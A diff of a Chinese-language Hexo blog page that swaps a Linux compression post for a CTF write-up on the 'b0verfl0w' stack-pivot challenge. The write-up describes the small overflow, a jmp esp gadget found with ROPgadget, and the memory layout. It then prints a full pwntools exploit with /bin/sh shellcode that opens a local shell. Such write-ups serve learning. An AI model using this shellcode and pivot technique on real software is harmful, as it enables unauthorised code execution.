@@ -87,7 +87,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="linux," />
+  <meta name="keywords" content="pwn," />
 
 
 
@@ -103,17 +103,17 @@
 
 
 
-<meta name="description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
-<meta name="keywords" content="linux">
+<meta name="description" content="stack privot 题目溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。 基本利用思路如下 利用栈溢出布置shellcode控制eip指向shellcode处 第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux之文件打包与解压缩">
-<meta property="og:url" content="http://yoursite.com/2017/06/06/linux文件压缩/index.html">
+<meta property="og:title" content="b0verfl0w'">
+<meta property="og:url" content="http://yoursite.com/2018/03/18/b0verfl0w/index.html">
 <meta property="og:site_name" content="尿尿">
-<meta property="og:description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
-<meta property="og:updated_time" content="2017-06-06T10:26:05.306Z">
+<meta property="og:description" content="stack privot 题目溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。 基本利用思路如下 利用栈溢出布置shellcode控制eip指向shellcode处 第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以">
+<meta property="og:updated_time" content="2018-03-18T16:00:49.864Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux之文件打包与解压缩">
-<meta name="twitter:description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
+<meta name="twitter:title" content="b0verfl0w'">
+<meta name="twitter:description" content="stack privot 题目溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。 基本利用思路如下 利用栈溢出布置shellcode控制eip指向shellcode处 第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以">
 
 
 
@@ -141,13 +141,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/06/06/linux文件压缩/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/03/18/b0verfl0w/"/>
 
 
 
 
 
-  <title> linux之文件打包与解压缩 | 尿尿 </title>
+  <title> b0verfl0w' | 尿尿 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="en">
@@ -314,7 +314,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/06/linux文件压缩/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/18/b0verfl0w/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lin Miaoqian">
@@ -335,7 +335,7 @@
             
             
               
-                linux之文件打包与解压缩
+                b0verfl0w'
               
             
           </h1>
@@ -350,8 +350,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-06T16:01:56+08:00">
-                2017-06-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-18T23:11:36+08:00">
+                2018-03-18
               </time>
             
 
@@ -361,28 +361,6 @@
           </span>
 
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习/" itemprop="url" rel="index">
-                    <span itemprop="name">学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -391,9 +369,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/06/06/linux文件压缩/#comments" itemprop="discussionUrl">
+                <a href="/2018/03/18/b0verfl0w/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/06/06/linux文件压缩/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2018/03/18/b0verfl0w/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -419,7 +397,16 @@
       
 
       
-        <p>好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。<br>本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar<br><a id="more"></a> </p>
+        <p>stack privot 题目<br>溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。</p>
+<p>基本利用思路如下</p>
+<p>利用栈溢出布置shellcode<br>控制eip指向shellcode处</p>
+<p>第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。</p>
+<p><code>ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39;</code></p>
+<p>size(shellcode+padding)=0x20<br>size(fake ebp)=0x4<br>size(0x08048504)=0x4<br>所以我们最后一段需要执行的指令就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sub 0x28,esp</div><div class="line">jmp esp</div></pre></td></tr></table></figure>
+<p>Memory layout:<br>| Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting | </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">sh = process(&apos;./b0verfl0w&apos;)</div><div class="line">shellcode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;</div><div class="line">padding = &apos;a&apos;*13</div><div class="line">jmp_esp = 0x08048504</div><div class="line">sub_esp_jmp = asm(&apos;sub esp,0x28;jmp esp&apos;)</div><div class="line">payload = shellcode+padding+p32(jmp_esp)+sub_esp_jmp</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure>
+<p>我不明白既然有了 asm(‘sub esp,0x28;jmp esp’) 为什么还需要直接跳转到esp的gadgets。<br>解释：我们就可以借由jmp esp将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell</p>
 
       
     </div>
@@ -449,7 +436,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/linux/" rel="tag"># linux</a>
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
@@ -462,18 +449,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/06/06/pictures/" rel="next" title="如何在 hexo 博客中插入图片">
-                <i class="fa fa-chevron-left"></i> 如何在 hexo 博客中插入图片
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/14/learncss1/" rel="prev" title="CSS基础学习[1]">
-                CSS基础学习[1] <i class="fa fa-chevron-right"></i>
+              <a href="/2018/03/18/XDCTF2015-pwn200/" rel="prev" title="XDCTF2015-pwn200(DynELF)'">
+                XDCTF2015-pwn200(DynELF)' <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -784,9 +767,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2017/06/06/linux文件压缩/';
-          this.page.identifier = '2017/06/06/linux文件压缩/';
-          this.page.title = 'linux之文件打包与解压缩';
+          this.page.url = 'http://yoursite.com/2018/03/18/b0verfl0w/';
+          this.page.identifier = '2018/03/18/b0verfl0w/';
+          this.page.title = 'b0verfl0w\'';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://yuuoniy.disqus.com/embed.js';
